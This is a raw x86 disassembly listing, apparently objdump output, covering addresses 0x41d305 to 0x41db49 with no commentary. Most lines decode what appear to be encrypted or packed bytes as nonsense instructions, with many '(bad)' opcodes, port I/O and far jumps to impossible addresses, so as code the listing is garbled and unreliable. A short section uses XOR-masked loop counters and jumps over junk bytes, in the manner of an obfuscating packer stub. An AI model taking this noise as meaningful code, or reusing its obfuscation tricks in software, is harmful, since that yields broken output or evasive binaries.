  41d305:	jmp    0xc3219e01
  41d30a:	fdiv   st(4),st
  41d30c:	jmp    0xd32cbef6
  41d311:	aam    0xf6
  41d313:	lods   al,BYTE PTR ds:[esi]
  41d314:	mov    ecx,0xeed5fec4
  41d319:	jmp    0x41d30c
  41d31b:	mov    edx,0xdfe6f0ce
  41d320:	ret    0xf9
  41d323:	test   BYTE PTR [eax],0xd8
  41d326:	loopne 0x41d32e
  41d328:	int    0xf9
  41d32a:	(bad)  
  41d32c:	mov    esi,0xcad6b1bc
  41d331:	in     eax,dx
  41d332:	out    dx,eax
  41d333:	aam    0xce
  41d335:	mov    cl,0xcf
  41d337:	leave  
  41d338:	enter  0xdac9,0xd3
  41d33c:	shr    dh,1
  41d33e:	into   
  41d33f:	in     al,dx
  41d340:	rcl    dh,cl
  41d342:	aam    0xea
  41d344:	les    eax,FWORD PTR [esi]
  41d346:	sti    
  41d347:	or     BYTE PTR [esi],al
  41d349:	out    0xdb,eax
  41d34b:	add    ah,al
  41d34d:	retf   0xb1ee
  41d350:	xlat   BYTE PTR ds:[ebx]
  41d351:	out    0xf4,al
  41d353:	iret   
  41d354:	call   0xf11ac44b
  41d359:	icebp  
  41d35a:	rcr    eax,1
  41d35c:	mov    ebx,0xf0d0c1e1
  41d361:	fsubrp st(4),st
  41d363:	shl    cl,cl
  41d365:	sti    
  41d366:	retf   0xe6fc
  41d369:	add    al,BYTE PTR [ebx]
  41d36b:	icebp  
  41d36c:	jmp    0xefac:0xbcb1d7c1
  41d373:	(bad)  
  41d374:	into   
  41d375:	clc    
  41d376:	mov    ebx,0xddf0d9b8
  41d37b:	stc    
  41d37c:	add    bl,dl
  41d37e:	shl    edi,cl
  41d380:	mov    esi,0xc9cb00d0
  41d385:	fcmovu st,st(5)
  41d387:	push   es
  41d388:	std    
  41d389:	in     eax,0xe2
  41d38b:	or     eax,0xc9f7cfbc
  41d390:	ret    0xc2e9
  41d393:	out    0xcf,al
  41d395:	scas   al,BYTE PTR es:[edi]
  41d396:	(bad)  
  41d398:	sti    
  41d399:	stc    
  41d39a:	rol    DWORD PTR [edx],cl
  41d39c:	mov    ebp,0xc6bf07fa
  41d3a1:	int3   
  41d3a2:	cli    
  41d3a3:	rcr    al,cl
  41d3a5:	out    dx,eax
  41d3a6:	(bad)  
  41d3a7:	fmul   QWORD PTR [esi]
  41d3a9:	(bad)  
  41d3aa:	cld    
  41d3ab:	stc    
  41d3ac:	shl    dl,cl
  41d3ae:	mov    esp,0xd1cad6e4
  41d3b3:	mov    cl,0xb0
  41d3b5:	(bad)  
  41d3b6:	(bad)  
  41d3b8:	in     eax,0xf2
  41d3ba:	mov    esi,0x3e2dfc3
  41d3bf:	int    0xd7
  41d3c1:	vpavgb ymm0,ymm3,YMMWORD PTR [edx]
  41d3c5:	or     esi,esp
  41d3c7:	(bad)  
  41d3c8:	dec    BYTE PTR [esi]
  41d3ca:	adc    esp,edi
  41d3cc:	stos   DWORD PTR es:[edi],eax
  41d3cd:	jmp    0x41d399
  41d3cf:	retf   0xe3d5
  41d3d2:	jecxz  0x41d39e
  41d3d4:	mov    dl,0xce
  41d3d6:	mov    ah,0xe8
  41d3d8:	sar    eax,1
  41d3da:	mov    ebx,0xbcdcf0fd
  41d3df:	out    0x81,al
  41d3e1:	sar    ebx,0x72
  41d3e4:	xor    al,BYTE PTR [eax]
  41d3e6:	sub    eax,ecx
  41d3e8:	cmp    edx,eax
  41d3ea:	jne    0x421c8b
  41d3f0:	mov    eax,DWORD PTR [ebp-0x8]
  41d3f3:	add    eax,DWORD PTR [ebp-0x10c]
  41d3f9:	mov    al,BYTE PTR [eax]
  41d3fb:	mov    BYTE PTR [ebp-0x131],al
  41d401:	mov    eax,DWORD PTR [ebp-0x118]
  41d407:	xor    eax,0x75108b5
  41d40c:	add    eax,0x3272fb
  41d411:	mov    DWORD PTR [ebp-0x138],eax
  41d417:	jmp    0x41d429
  41d41c:	mov    eax,DWORD PTR [ebp-0x138]
  41d422:	inc    eax
  41d423:	mov    DWORD PTR [ebp-0x138],eax
  41d429:	mov    eax,DWORD PTR [ebp-0x114]
  41d42f:	xor    eax,0x75108b5
  41d434:	add    eax,0x3272fb
  41d439:	cmp    DWORD PTR [ebp-0x138],eax
  41d43f:	jmp    0x41f7e5
  41d444:	xor    BYTE PTR [eax-0xf141525],0x90
  41d44b:	lock inc ecx
  41d44d:	cs push 0xebd941f3
  41d453:	repz dec edi
  41d455:	(bad)  
  41d456:	jp     0x41d4d3
  41d458:	add    bl,BYTE PTR [eax-0x14fc8485]
  41d45e:	retf   
  41d45f:	retf   
  41d460:	(bad)  
  41d462:	mov    ebp,0xc5e7fa
  41d467:	shr    BYTE PTR [ebx-0x4e361038],cl
  41d46d:	mov    ch,0xd5
  41d46f:	mov    ebx,0xf6d8b1f5
  41d474:	mov    ah,0xff
  41d476:	out    dx,al
  41d477:	ret    
  41d478:	repz sti 
  41d47a:	add    esi,ecx
  41d47c:	fcomi  st,st(3)
  41d47e:	rcr    esi,0xfc
  41d481:	ffreep st(7)
  41d483:	jmp    0xd031cf82
  41d488:	mov    cl,0xc2
  41d48a:	icebp  
  41d48b:	out    dx,eax
  41d48c:	ror    edx,0xb7
  41d48f:	mov    dl,0xcd
  41d491:	sti    
  41d492:	cmc    
  41d493:	mov    al,0xf2
  41d495:	cli    
  41d496:	xlat   BYTE PTR ds:[ebx]
  41d497:	xlat   BYTE PTR ds:[ebx]
  41d498:	add    edi,edx
  41d49a:	rol    edi,0x2
  41d49d:	icebp  
  41d49e:	rcl    cl,cl
  41d4a0:	cli    
  41d4a1:	shr    ecx,0xe
  41d4a4:	int    0x2
  41d4a6:	pop    es
  41d4a7:	add    DWORD PTR [ebx-0x31374f41],ebp
  41d4ad:	in     eax,0xd7
  41d4af:	in     eax,dx
  41d4b0:	in     al,0xd4
  41d4b2:	call   0xd1269386
  41d4b7:	repz std 
  41d4b9:	fsubr  st(3),st
  41d4bb:	shl    esi,0xbd
  41d4be:	fidivr WORD PTR [eax-0x2a3402f9]
  41d4c4:	add    bh,bh
  41d4c6:	add    ch,dl
  41d4c8:	shr    DWORD PTR [esi-0x39480c15],1
  41d4ce:	jmp    0xe8b94
  41d4d3:	in     eax,dx
  41d4d4:	fsub   st(6),st
  41d4d6:	jmp    0x7e7:0xdbe0bab9
  41d4dd:	cld    
  41d4de:	cld    
  41d4df:	sar    cl,cl
  41d4e1:	rcr    cl,1
  41d4e3:	stc    
  41d4e4:	jmp    0x41d4b0
  41d4e6:	or     cl,BYTE PTR [eax]
  41d4e8:	scas   eax,DWORD PTR es:[edi]
  41d4e9:	jmp    0xd01481b9
  41d4ee:	(bad)  
  41d4ef:	rcl    esp,1
  41d4f1:	les    esi,FWORD PTR [eax-0x35452c1a]
  41d4f7:	mov    ebx,0xbcfbe0be
  41d4fc:	aad    0xff
  41d4fe:	out    0xf6,al
  41d500:	ret    
  41d501:	out    0xe1,al
  41d503:	add    eax,0xe7fcf30e
  41d508:	rol    ch,1
  41d50a:	lods   al,BYTE PTR ds:[esi]
  41d50b:	out    dx,al
  41d50c:	mov    dh,0xeb
  41d50e:	iret   
  41d50f:	(bad)  
  41d510:	hlt    
  41d511:	call   0xc94094e1
  41d516:	lock mov esp,0xe7c3d0db
  41d51c:	int    0xf5
  41d51e:	bnd jmp 0x41d4f8
  41d521:	or     ecx,eax
  41d523:	sti    
  41d524:	cli    
  41d525:	ret    0x313
  41d528:	loope  0x41d510
  41d52a:	shl    cl,cl
  41d52c:	jmp    0xeeed:0xb7e6cbc9
  41d533:	mov    edx,0xe202cadf
  41d538:	rol    dl,cl
  41d53a:	aam    0xc2
  41d53c:	repz (bad) 
  41d53e:	out    0xe6,eax
  41d540:	fcom   st(6)
  41d542:	(bad)  
  41d543:	in     eax,dx
  41d544:	fild   DWORD PTR [esi]
  41d546:	or     cl,BYTE PTR ds:0xdcbeb2d9
  41d54c:	aad    0xc7
  41d54e:	(bad)  
  41d551:	mov    al,0xf0
  41d553:	into   
  41d554:	repnz fidivr WORD PTR [ecx-0x130d430c]
  41d55b:	ret    
  41d55c:	icebp  
  41d55d:	(bad)  
  41d55e:	loopne 0x41d518
  41d560:	lock leave 
  41d562:	jmp    0xc846be30
  41d567:	out    dx,eax
  41d568:	out    0xae,eax
  41d56a:	into   
  41d56b:	ret    0xd5ad
  41d56e:	div    BYTE PTR [esp+edx*8-0x2b02374f]
  41d575:	cld    
  41d576:	(bad)  
  41d577:	ret    0xe1f5
  41d57a:	in     al,dx
  41d57b:	lock repnz add esi,ebx
  41d57f:	add    eax,0xf4040601
  41d584:	ffree  st(4)
  41d586:	cli    
  41d587:	fxam   
  41d589:	shl    al,0xcb
  41d58c:	retf   
  41d58d:	(bad)  
  41d58e:	mov    al,0xcf
  41d590:	mov    ah,0xea
  41d592:	mov    ah,0xdb
  41d594:	aad    0xdb
  41d596:	call   0xf5f89e67
  41d59b:	sar    cl,1
  41d59d:	call   ebx
  41d59f:	lds    ecx,FWORD PTR [edx]
  41d5a1:	out    dx,eax
  41d5a2:	retf   0xc5f8
  41d5a5:	(bad)
  41d5a8:	sar    DWORD PTR [ebp-0x4b2e1f1d],1
  41d5ae:	leave  
  41d5af:	retf   0xcfea
  41d5b2:	out    dx,al
  41d5b3:	(bad)  
  41d5b5:	(bad)  
  41d5b7:	mov    esi,0xf0c0e2de
  41d5bc:	mov    edi,0x501e1ec
  41d5c1:	add    eax,DWORD PTR [ecx]
  41d5c3:	or     cl,BYTE PTR [edx]
  41d5c5:	add    esi,esp
  41d5c7:	or     eax,0xa8c1e5c0
  41d5cc:	mov    cl,0xc6
  41d5ce:	int3   
  41d5cf:	repz retf 
  41d5d1:	repnz mov eax,0xcfedeff7
  41d5d7:	mov    al,0xd5
  41d5d9:	add    bl,bl
  41d5db:	hlt    
  41d5dc:	mov    BYTE PTR ds:0xe6e3b8c7,0xc5
  41d5e3:	call   0x5259bb5
  41d5e8:	int    0xa9
  41d5ea:	leave  
  41d5eb:	int3   
  41d5ec:	loopne 0x41d5b9
  41d5ee:	loope  0x41d5db
  41d5f0:	mov    bh,0xd3
  41d5f2:	(bad)  
  41d5f3:	sar    esp,cl
  41d5f5:	mov    ebx,0xc2d0d1ea
  41d5fa:	add    esi,ebx
  41d5fc:	rcr    esi,1
  41d5fe:	fsub   st(2),st
  41d600:	add    eax,0xd5fce1d6
  41d605:	add    al,BYTE PTR ds:0xf0d1e1f1
  41d60b:	out    dx,eax
  41d60c:	mov    esp,0xf0c8cceb
  41d611:	enter  0xc6d2,0xf2
  41d615:	mov    esi,0xb8edd9d3
  41d61a:	in     al,dx
  41d61b:	mov    edi,0xe2dcd2ff
  41d620:	add    BYTE PTR [edx],al
  41d622:	(bad)  
  41d624:	fmulp  st(1),st
  41d626:	(bad)  
  41d627:	iret   
  41d628:	in     eax,0xe4
  41d62a:	retf   
  41d62b:	mov    bl,0xb0
  41d62d:	mov    esp,0xcaf7a8c8
  41d632:	fdiv   st,st(5)
  41d634:	into   
  41d635:	fdivrp st(6),st
  41d637:	(bad)  
  41d638:	call   0xfc0fd930
  41d63d:	ret    
  41d63e:	sar    bh,1
  41d640:	cld    
  41d641:	rol    DWORD PTR [ebx],0xc6
  41d644:	add    esp,edi
  41d646:	jmp    0xc4f1:0xbec0e3dc
  41d64d:	jecxz  0x41d631
  41d64f:	out    0xcd,al
  41d651:	(bad)  [edi-0x3030a2f]
  41d657:	cmc    
  41d658:	aad    0xfb
  41d65a:	out    dx,al
  41d65b:	ret    0xf4ec
  41d65e:	ret    0xc707
  41d661:	out    dx,eax
  41d662:	pop    es
  41d663:	(bad)  
  41d664:	(bad)  
  41d666:	loope  0x41d665
  41d668:	int3   
  41d669:	out    0xb1,eax
  41d66b:	out    dx,eax
  41d66c:	in     eax,0xcf
  41d66e:	shr    ecx,cl
  41d670:	int3   
  41d671:	mov    ch,0xb5
  41d673:	aam    0xdc
  41d675:	fmul   st(4),st
  41d677:	jmp    0xc0e2:0xb4fff1f9
  41d67e:	jmp    0xbd8:0xc8c9daf7
  41d685:	loope  0x41d67f
  41d687:	add    al,0xde
  41d689:	shl    bh,cl
  41d68b:	repz ffree st(6)
  41d68e:	hlt    
  41d68f:	int3   
  41d690:	aam    0xf3
  41d692:	out    0xfe,al
  41d694:	fdivr  st(6),st
  41d696:	out    dx,al
  41d697:	out    dx,al
  41d698:	loopne 0x41d682
  41d69a:	cli    
  41d69b:	(bad)  
  41d69d:	jecxz  0x41d685
  41d69f:	fmul   QWORD PTR [ecx]
  41d6a1:	lds    eax,FWORD PTR [esi]
  41d6a3:	(bad)  
  41d6a4:	or     eax,0xbd08d9de
  41d6a9:	rcr    edi,0xcb
  41d6ac:	mov    cl,0xf3
  41d6ae:	mov    ch,0xdb
  41d6b0:	(bad)  
  41d6b1:	in     al,dx
  41d6b2:	out    0xb5,eax
  41d6b4:	hlt    
  41d6b5:	mov    ebp,0x2f1f803
  41d6ba:	rcl    dh,0xff
  41d6bd:	add    esi,esp
  41d6bf:	aad    0xc6
  41d6c1:	cld    
  41d6c2:	fstp   st(1)
  41d6c4:	or     eax,0xbceaede5
  41d6c9:	out    dx,eax
  41d6ca:	mov    bl,0xd3
  41d6cc:	lods   al,BYTE PTR ds:[esi]
  41d6cd:	enter  0xe0f4,0xcd
  41d6d1:	scas   al,BYTE PTR es:[edi]
  41d6d2:	iret   
  41d6d3:	mov    ebx,0x2bdeeee
  41d6d8:	loopne 0x41d6ad
  41d6da:	add    eax,eax
  41d6dc:	int    0xd4
  41d6de:	lock aam 0xcb
  41d6e1:	aam    0xbd
  41d6e3:	call   0xee02e2ed
  41d6e8:	(bad)  
  41d6e9:	repz call 0xd52ebdbb
  41d6ef:	mov    cl,0xdb
  41d6f1:	(bad)  
  41d6f3:	stc    
  41d6f4:	jmp    0xcee8:0xe1c8ddf9
  41d6fb:	mov    edi,0x405d6c1
  41d700:	rcr    ebp,0xd7
  41d703:	or     al,BYTE PTR [ebx]
  41d705:	hlt    
  41d706:	in     al,0x5
  41d708:	mov    ebp,0xe0e1c9c8
  41d70d:	in     al,0xe1
  41d70f:	mov    edx,0xcceeb1b1
  41d714:	call   0xc911bfce
  41d719:	ret    0xcd01
  41d71c:	rcl    esp,cl
  41d71e:	or     bl,bl
  41d720:	inc    ecx
  41d722:	out    dx,eax
  41d723:	test   BYTE PTR [ecx],0xc2
  41d726:	retf   0xc601
  41d729:	iret   
  41d72a:	icebp  
  41d72b:	out    0xc2,al
  41d72d:	(bad)  
  41d72e:	mov    ch,0xdb
  41d730:	in     eax,0xb6
  41d732:	mov    cl,0xcc
  41d734:	fidiv  DWORD PTR [edx-0x270d1318]
  41d73a:	fucom  st(5)
  41d73c:	loopne 0x41d737
  41d73e:	(bad)  
  41d73f:	loopne 0x41d726
  41d741:	in     al,0xe4
  41d743:	cmc    
  41d744:	cmc    
  41d745:	or     bh,al
  41d747:	adc    ch,ah
  41d749:	int3   
  41d74a:	loopne 0x41d72e
  41d74c:	shl    bl,0xcc
  41d74f:	retf   0xcbf8
  41d752:	sti    
  41d753:	test   dl,0xde
  41d756:	dec    eax
  41d758:	in     al,dx
  41d759:	into   
  41d75a:	(bad)  
  41d75c:	fdiv   st,st(0)
  41d75e:	lock or bh,BYTE PTR [edi-0x3a3bf010]
  41d765:	leave  
  41d766:	add    al,BYTE PTR [esi+edi*4]
  41d769:	(bad)  
  41d76a:	mov    edi,0xe9fbf6e7
  41d76f:	(bad)  
  41d770:	lock (bad) 
  41d774:	leave  
  41d775:	mov    esi,0xedc8f1ec
  41d77a:	fdivp  st(6),st
  41d77c:	icebp  
  41d77d:	in     eax,0xf7
  41d77f:	clc    
  41d780:	leave  
  41d781:	div    edi
  41d783:	(bad)  
  41d785:	loope  0x41d774
  41d787:	or     al,0xef
  41d789:	out    dx,eax
  41d78a:	mov    cl,0xf1
  41d78c:	(bad)  
  41d78d:	int3   
  41d78e:	mov    al,0xf2
  41d790:	(bad)
  41d793:	hlt    
  41d794:	cld    
  41d795:	(bad)  
  41d797:	loope  0x41d782
  41d799:	into   
  41d79a:	lock (bad) 
  41d79c:	fcmovnb st,st(3)
  41d79e:	cmc    
  41d79f:	jecxz  0x41d789
  41d7a1:	retf   0xd806
  41d7a4:	aad    0xd
  41d7a6:	cli    
  41d7a7:	pop    es
  41d7a8:	ret    
  41d7a9:	mov    esi,0xc5f5c7c0
  41d7ae:	out    dx,al
  41d7af:	icebp  
  41d7b0:	out    dx,al
  41d7b1:	out    0xda,eax
  41d7b3:	retf   0xdfe9
  41d7b6:	mov    esi,0xfcf7dfff
  41d7bb:	jecxz  0x41d7c0
  41d7bd:	mov    ebp,0x70af2d8
  41d7c2:	add    ecx,edx
  41d7c4:	psubd  mm1,QWORD PTR [edi]
  41d7c7:	out    0xc4,al
  41d7c9:	mov    eax,0xcab3aeb7
  41d7ce:	into   
  41d7cf:	mov    ch,0xe6
  41d7d1:	les    esi,FWORD PTR [edi-0x2e310d54]
  41d7d7:	cmc    
  41d7d8:	fcmovnbe st,st(5)
  41d7da:	(bad)  
  41d7db:	cli    
  41d7dc:	mov    BYTE PTR [eax],0xdd
  41d7df:	lock (bad) 
  41d7e1:	fadd   DWORD PTR [edi]
  41d7e3:	fdivp  st(7),st
  41d7e5:	jmp    0xb30cd1c9
  41d7ea:	in     eax,dx
  41d7eb:	mov    dh,0xcd
  41d7ed:	mov    dl,0xd4
  41d7ef:	idiv   DWORD PTR [ebx-0xd262a19]
  41d7f5:	out    dx,eax
  41d7f6:	shl    BYTE PTR [ecx+eax*1-0x1b082402],1
  41d7fd:	loope  0x41d7ca
  41d7ff:	add    esp,ebx
  41d801:	or     ebp,ecx
  41d803:	leave  
  41d804:	enter  0xfc4,0x1
  41d808:	in     al,0xe0
  41d80a:	ret    
  41d80b:	leave  
  41d80c:	hlt    
  41d80d:	mov    dh,0xb4
  41d80f:	(bad)  
  41d810:	icebp  
  41d811:	clc    
  41d812:	out    dx,al
  41d813:	fucomi st,st(7)
  41d815:	int3   
  41d816:	rcl    ebx,cl
  41d818:	(bad)  
  41d819:	xlat   BYTE PTR ds:[ebx]
  41d81a:	rcl    dh,cl
  41d81c:	cmc    
  41d81d:	ret    0xc201
  41d820:	cli    
  41d821:	add    edx,edi
  41d823:	add    ah,al
  41d825:	fld    QWORD PTR [ecx]
  41d827:	jmp    0x41d809
  41d829:	enter  0xe5f6,0xdc
  41d82d:	out    0xe3,eax
  41d82f:	out    0xc8,eax
  41d831:	loopne 0x41d823
  41d833:	xlat   BYTE PTR ds:[ebx]
  41d834:	fcom   st(1)
  41d836:	mov    ebx,0xfbfdefdf
  41d83b:	in     eax,dx
  41d83c:	add    ebx,esi
  41d83e:	hlt    
  41d83f:	test   BYTE PTR [eax],0xc4
  41d842:	jmp    ecx
  41d844:	(bad)  
  41d845:	stc    
  41d846:	(bad)  
  41d848:	mov    bl,0xb1
  41d84a:	out    dx,al
  41d84b:	jecxz  0x41d80e
  41d84d:	mov    ch,0xf1
  41d84f:	int    0xc9
  41d851:	hlt    
  41d852:	int    0xcb
  41d854:	call   0xc41ec643
  41d859:	out    0x3,eax
  41d85b:	rcr    bl,cl
  41d85d:	stc    
  41d85e:	add    bl,ah
  41d860:	fisttp QWORD PTR [eax]
  41d862:	enter  0x7e9,0xda
  41d866:	or     al,0xd9
  41d868:	ret    
  41d869:	in     eax,0xc8
  41d86b:	jecxz  0x41d818
  41d86d:	ret    
  41d86e:	retf   
  41d86f:	mov    cl,0xe4
  41d871:	in     al,0xf0
  41d873:	retf   0xe9f3
  41d876:	out    dx,eax
  41d877:	jmp    0xe3d0:0x6c0bacc
  41d87e:	push   es
  41d87f:	pop    es
  41d880:	fcomp  st(3)
  41d882:	add    eax,0xefebece6
  41d887:	enter  0xaadf,0xe6
  41d88b:	in     al,dx
  41d88c:	ret    
  41d88d:	imul   DWORD PTR [ecx-0x14263a2f]
  41d893:	fcomip st,st(1)
  41d895:	fdivr  DWORD PTR [ebp-0x2b01221d]
  41d89b:	in     al,dx
  41d89c:	loopne 0x41d86e
  41d89e:	icebp  
  41d89f:	(bad)  
  41d8a0:	fsub   st(2),st
  41d8a2:	(bad)  
  41d8a4:	out    dx,eax
  41d8a5:	fucom  st(7)
  41d8a7:	loope  0x41d898
  41d8a9:	mov    ah,0xb2
  41d8ac:	in     eax,0xf3
  41d8ae:	(bad)  [edx-0x50a0d26]
  41d8b4:	fcomip st,st(0)
  41d8b6:	lock cli 
  41d8b8:	(bad)  
  41d8ba:	loopne 0x41d89d
  41d8bc:	cld    
  41d8bd:	sti    
  41d8be:	jmp    0xe6f5:0x9d4f407
  41d8c5:	or     eax,DWORD PTR [eax]
  41d8c7:	les    edi,FWORD PTR [esi-0x381d1e3a]
  41d8cd:	iret   
  41d8ce:	out    dx,al
  41d8cf:	in     al,0xf2
  41d8d1:	(bad)  
  41d8d2:	mov    ah,0xb4
  41d8d4:	cld    
  41d8d5:	jmp    0x41d8d0
  41d8d7:	mov    eax,0xf9f3efe2
  41d8dc:	(bad)  
  41d8de:	add    al,dl
  41d8e0:	loope  0x41d8a4
  41d8e2:	call   0xd35dac3
  41d8e7:	iret   
  41d8e8:	(bad)  
  41d8ea:	retf   0xd0cd
  41d8ed:	aam    0xea
  41d8ef:	icebp  
  41d8f0:	jmp    0x41d8d9
  41d8f2:	leave  
  41d8f3:	(bad)  
  41d8f4:	rcl    ch,1
  41d8f6:	shr    dl,1
  41d8f8:	mov    esp,0xc0fef3fe
  41d8fd:	aad    0xc7
  41d8ff:	aam    0xc2
  41d901:	add    DWORD PTR [ecx],ecx
  41d903:	add    al,0xfe
  41d905:	std    
  41d906:	(bad)  
  41d908:	out    dx,al
  41d909:	scas   eax,DWORD PTR es:[edi]
  41d90a:	out    0xad,eax
  41d90c:	mov    ebp,0xf2c9f6d5
  41d911:	mov    al,0xd9
  41d913:	clc    
  41d914:	repz leave 
  41d916:	sti    
  41d917:	jmp    0xd316ccd3
  41d91c:	hlt    
  41d91d:	rol    DWORD PTR [esi],cl
  41d91f:	add    esp,esi
  41d921:	pop    es
  41d922:	neg    ebx
  41d924:	or     eax,DWORD PTR ds:0xd8b101ee
  41d92a:	test   al,0xac
  41d92c:	jmp    0xece7:0xc0f3b3c5
  41d933:	mov    eax,0xf9bfbaba
  41d938:	enter  0xddc8,0xb4
  41d93c:	add    esi,esp
  41d93e:	mov    ecx,0xff0ff1d4
  41d943:	loop   0x41d950
  41d945:	or     eax,0xc4abfeef
  41d94a:	fadd   st(4),st
  41d94c:	aad    0xe9
  41d94e:	jmp    0xb8fb9023
  41d953:	fptan  
  41d955:	jmp    0xe43cb230
  41d95a:	int3   
  41d95b:	aam    0xe0
  41d95d:	push   es
  41d95e:	out    0xf1,eax
  41d960:	add    ebx,edx
  41d962:	imul   ebp
  41d964:	iret   
  41d965:	int    0xd8
  41d967:	(bad)  
  41d969:	fsubr  st(7),st
  41d96b:	(bad)  
  41d96c:	lods   al,BYTE PTR ds:[esi]
  41d96d:	int    0xd3
  41d96f:	cli    
  41d970:	rcr    dl,cl
  41d972:	repz ror ebp,1
  41d975:	(bad)  
  41d977:	loope  0x41d94d
  41d979:	mov    eax,0xfaf5c1df
  41d97e:	in     al,0xde
  41d980:	mov    DWORD PTR [ebx],0xdefc0a0f
  41d986:	add    cl,dh
  41d988:	fadd   st,st(7)
  41d98a:	scas   al,BYTE PTR es:[edi]
  41d98b:	ret    0xadab
  41d98e:	mov    cl,0xcf
  41d990:	shr    bh,1
  41d992:	mov    ch,0xb0
  41d994:	mov    ch,0xff
  41d996:	aam    0xf6
  41d998:	mov    edi,0xdefcffe7
  41d99d:	cmc    
  41d99e:	add    eax,0x4fff0c0
  41d9a3:	add    esp,eax
  41d9a5:	enter  0xcc05,0xd1
  41d9a9:	(bad)  
  41d9ab:	mov    cl,0xcf
  41d9ad:	repz call 0xbafbba8e
  41d9b3:	int    0xbb
  41d9b5:	repz idiv BYTE PTR [edx-0x1e312045]
  41d9bc:	fstp   st(1)
  41d9be:	ret    
  41d9bf:	or     esp,ecx
  41d9c1:	ret    0x4ff
  41d9c4:	(bad)  
  41d9c6:	vaddsubpd ymm5,ymm2,ymm0
  41d9ca:	loop   0x41d98c
  41d9cc:	(bad)  
  41d9cd:	ror    ah,1
  41d9cf:	fneni(8087 only) 
  41d9d1:	out    dx,eax
  41d9d2:	out    0xda,al
  41d9d4:	mov    edi,0xd9d9d3b8
  41d9d9:	sar    BYTE PTR [ecx-0x213a0b14],cl
  41d9df:	shl    ecx,1
  41d9e1:	(bad)  
  41d9e3:	(bad)  
  41d9e4:	out    dx,eax
  41d9e5:	aam    0xcc
  41d9e7:	jmp    0x41d9a5
  41d9e9:	out    dx,al
  41d9ea:	shl    ebp,0xaf
  41d9ed:	loopne 0x41d9e6
  41d9ef:	shl    esp,0xb1
  41d9f2:	out    dx,eax
  41d9f3:	(bad)  
  41d9f5:	mov    ebx,0xe3f903e3
  41d9fa:	(bad)  
  41d9fb:	out    dx,al
  41d9fc:	out    0x7,al
  41d9fe:	rol    DWORD PTR [eax],cl
  41da00:	loop   0x41da09
  41da02:	sti    
  41da03:	fxch   st(1)
  41da05:	fcmove st,st(0)
  41da07:	(bad)  
  41da09:	retf   0xcbdd
  41da0c:	cmc    
  41da0d:	in     al,dx
  41da0e:	mov    bh,0xb0
  41da10:	mov    dl,0xe7
  41da12:	mov    al,0xef
  41da14:	rcl    eax,cl
  41da16:	(bad)  
  41da18:	shl    ebx,0x0
  41da1b:	sar    ebx,1
  41da1d:	in     al,0xf9
  41da1f:	(bad)  
  41da20:	cmc    
  41da21:	jecxz  0x41da1b
  41da23:	add    ch,cl
  41da25:	or     eax,0xaece1213
  41da2a:	ret    0xebcc
  41da2d:	ret    0xefd1
  41da30:	mov    al,0xd9
  41da32:	clc    
  41da33:	mov    ecx,0xbacad6f8
  41da38:	add    dl,bl
  41da3a:	(bad)  
  41da3c:	mov    ebx,0xae6eafb
  41da41:	out    0xf4,eax
  41da43:	cli    
  41da44:	clc    
  41da45:	adc    esp,ecx
  41da47:	push   es
  41da48:	lods   al,BYTE PTR ds:[esi]
  41da49:	xlat   BYTE PTR ds:[ebx]
  41da4a:	ret    0xbdde
  41da4d:	fninit 
  41da4f:	fcmovbe st,st(6)
  41da51:	rcr    edx,1
  41da53:	shl    ch,cl
  41da55:	stc    
  41da56:	ret    
  41da57:	mul    cl
  41da59:	shr    edi,0x5
  41da5c:	sar    BYTE PTR [ebp+0x4e6fa],0x5
  41da63:	aad    0xc3
  41da65:	(bad)
  41da68:	fsubr  QWORD PTR [edi+eiz*8-0x4e391153]
  41da6f:	jmp    0x41da40
  41da71:	out    dx,al
  41da72:	push   ebx
  41da74:	jmp    0x41da34
  41da76:	retf   
  41da77:	(bad)  
  41da78:	icebp  
  41da79:	inc    al
  41da7b:	ret    0xfbd6
  41da7e:	rcr    dl,1
  41da80:	retf   0xf707
  41da83:	(bad)  
  41da85:	add    eax,0xebe8ddee
  41da8a:	loope  0x41da3e
  41da8c:	lods   al,BYTE PTR ds:[esi]
  41da8d:	rcr    ebx,1
  41da8f:	(bad)  
  41da90:	retf   
  41da91:	(bad)  
  41da93:	mov    ebx,0xfacbdad4
  41da98:	into   
  41da99:	fdivr  st,st(2)
  41da9b:	fcom   st(1)
  41da9d:	shr    edx,cl
  41da9f:	xlat   BYTE PTR ds:[ebx]
  41daa0:	fcomp  st(6)
  41daa2:	out    0xef,al
  41daa4:	in     al,0xfc
  41daa6:	sti    
  41daa7:	into   
  41daa8:	sar    DWORD PTR [esi-0x114d2919],0xc4
  41daaf:	into   
  41dab0:	int3   
  41dab1:	cli    
  41dab2:	sar    ecx,cl
  41dab4:	(bad)  
  41dab6:	into   
  41dab7:	neg    ch
  41dab9:	lock aad 0xfc
  41dabc:	test   DWORD PTR [ebx+edi*8],0x900bfd1
  41dac3:	in     eax,0xd4
  41dac5:	int3   
  41dac6:	jecxz  0x41da88
  41dac8:	loop   0x41da99
  41daca:	repnz repnz rol ebx,1
  41dace:	in     eax,0xb2
  41dad0:	int    0xca
  41dad2:	shl    dh,cl
  41dad4:	(bad)  
  41dad5:	jmp    0x41da8c
  41dad7:	mov    edx,0x2fed0c1
  41dadc:	add    bh,al
  41dade:	push   es
  41dadf:	test   DWORD PTR [ecx],0xcebc1e6
  41dae5:	jmp    0xe70ab8ed
  41daea:	ret    0xc2c6
  41daed:	int3   
  41daee:	fidiv  DWORD PTR [ebp-0x2804483f]
  41daf4:	enter  0xfdf6,0xb8
  41daf8:	ffreep st(0)
  41dafa:	lock repz int 0xdf
  41dafe:	xlat   BYTE PTR ds:[ebx]
  41daff:	cmc    
  41db00:	retf   
  41db01:	jecxz  0x41dace
  41db03:	(bad)  
  41db04:	fucomi st,st(6)
  41db06:	loopne 0x41daf4
  41db08:	int    0xbd
  41db0a:	repz into 
  41db0c:	mov    bh,0xd2
  41db0e:	int3   
  41db0f:	rcr    eax,cl
  41db11:	clc    
  41db12:	out    0xfa,al
  41db14:	cmc    
  41db15:	jmp    0x41dae8
  41db17:	add    DWORD PTR [ecx-0x9082106],edi
  41db1d:	icebp  
  41db1e:	or     eax,DWORD PTR [esi+edi*8]
  41db21:	(bad)  
  41db23:	stc    
  41db24:	add    eax,0xe50007e5
  41db29:	call   0xe916c8f2
  41db2e:	mov    dh,0xca
  41db30:	mov    ah,0xd5
  41db32:	leave  
  41db33:	leave  
  41db34:	hlt    
  41db35:	in     eax,dx
  41db36:	enter  0xf1b0,0xd5
  41db3a:	shl    eax,cl
  41db3c:	add    bh,dh
  41db3e:	loopne 0x41db49
  41db40:	loopne 0x41db3d
  41db42:	jecxz  0x41db2d
  41db44:	call   0xf23bde0e
  41db49:	call   0xd0f3992e
